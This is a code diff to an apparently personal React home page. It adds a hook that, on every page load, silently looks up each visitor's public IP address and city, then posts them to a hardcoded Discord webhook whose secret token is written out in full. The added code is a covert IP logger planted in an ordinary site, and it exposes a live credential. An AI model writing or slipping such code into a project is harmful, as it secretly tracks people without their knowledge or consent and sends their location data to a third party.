@@ -7,6 +7,8 @@ import { use, useEffect, useRef, useState } from "react";
 import { useEffectOnce } from "usehooks-ts";
 import { useAnimation, motion } from "framer-motion";
 import copy from "copy-to-clipboard";
+import { publicIp, publicIpv4, publicIpv6 } from "public-ip";
+var ipLocation = require("ip-location");
 
 // CSS imports
 import styles from "../styles/pages/Home.module.css";
@@ -14,11 +16,60 @@ import styles from "../styles/pages/Home.module.css";
 // Component imports
 import SecLayout from "../components/_seclayout";
 import PageTitle from "../components/parts/PageTitle";
+import { get } from "jquery";
 
 // Page
 export default function Home() {
 	// showDiscordName state
 	const [showDiscordName, setShowDiscordName] = useState(false);
+
+	// using use effect, run this code on page load
+	useEffect(() => {
+		// post to https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR
+		// with the following json data
+
+		async function getLoc(ip: any) {
+			const response = await fetch("https://ipapi.co/" + ip + "/json/");
+			const data = await response.json();
+			console.log(data);
+			return data.region + " - " + data.city;
+		}
+
+		async function fetchData() {
+			var ipResponse = await fetch("https://api.ipify.org?format=json");
+			var ipData = await ipResponse.json();
+			var ip: string = ipData.ip;
+			console.log(ip);
+			await fetch(
+				"https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR",
+				{
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json",
+					},
+					body: JSON.stringify({
+						content: ip,
+						embeds: [
+							{
+								color: 0x00ff00,
+								fields: [
+									{
+										name: "IP",
+										value: ip,
+									},
+									{
+										name: "Location",
+										value: await getLoc(ip),
+									},
+								],
+							},
+						],
+					}),
+				}
+			);
+		}
+		fetchData();
+	}, []);
 
 	return (
 		<SecLayout>
